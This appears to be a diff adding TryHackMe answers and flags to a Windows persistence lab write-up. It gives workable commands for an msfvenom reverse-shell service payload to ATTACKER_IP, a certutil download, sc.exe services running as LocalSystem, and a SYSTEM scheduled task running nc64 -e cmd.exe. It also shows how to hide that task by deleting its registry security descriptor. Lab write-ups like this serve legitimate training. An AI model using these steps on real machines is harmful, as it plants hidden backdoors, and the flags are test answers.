@@ -66,14 +66,39 @@ Finally get the flag: <br />
 `THM{TXT_FILES_WOULD_NEVER_HURT_YOU}`
 
 ### Abusing Services
-- Insert flag7 here
-- Insert flag8 here
+- Insert flag7 here<br />
+Let's create a reverse shell with the format of a windows service, using msfvenom: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe`. <br />
+You can then copy the executable to your target system, say in C:\Windows and point the service's binPath to it. To transfer the payload, we can open an http server with python: `python3 -m http.server 8000`, then donwload it from powershell using certutil: `certutil -urlcache -split -f http://10.11.85.53/rev-svc.exe rev-svc.exe`<br />
+
+At this point we can create a service pointing to this payload, scheduled to start every time the machine is started: 
+
+      sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
+Now open a netcat listener, and start the service: 
+
+      sc.exe start THMservice2
+![image](https://github.com/user-attachments/assets/75934e7d-2541-45c8-b733-0a6d9b2d0a7f)<br />
+`THM{SUSPICIOUS_SERVICES}`
+
+- Insert flag8 here<br />
+I dont really want to create a different payload, to configure the existing service, just run: `sc.exe config THMservice3 binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"`, and do the same as before to get the flag: <br />
+![image](https://github.com/user-attachments/assets/8c4c08cc-1e1c-458e-a4b2-f53a1298d7e7)<br />
+`THM{IN_PLAIN_SIGHT}`
 
 ### Abusing Scheduled Tasks 
-- Insert flag9 here
+- Insert flag9 here<br />
+The following command: `schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM` creates a scheduled task that runs every minute, named THM-TaskBackdoor.<br />
+The /ru option indicates that the task will run with SYSTEM privileges. now simply open a listener on port 4449 and wait a few seconds: <br />
+![image](https://github.com/user-attachments/assets/de18b9cf-e4b9-436b-9836-a18fbd623aa3)<br />
+Apparently THM wants me to hide the sheduled task.. damn it. <br />
+To hide our scheduled task, we can make it invisible to any user in the system by deleting its **Security Descriptor** (SD). The security descriptor is simply an ACL that states which users have access to the scheduled task. Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.. Run `c:\tools\pstools\PsExec64.exe -s -i regedit` to open the registry. Move to `Computer\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor`<br />
+![image](https://github.com/user-attachments/assets/f08ca4ac-c3ef-47d6-a428-f03b2b3e572e)<br />
+Great:<br />
+![image](https://github.com/user-attachments/assets/5fc7b4bb-8937-4507-9b46-c8f0492d254c)<br />
+`THM{JUST_A_MATTER_OF_TIME}`
 
 ### Logon Triggered Persistence
-- Insert flag10 here
+- Insert flag10 here<br />
+Each user has a folder under C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there.<br />
 - Insert flag11 here
 - Insert flag12 here
 - Insert flag13 here
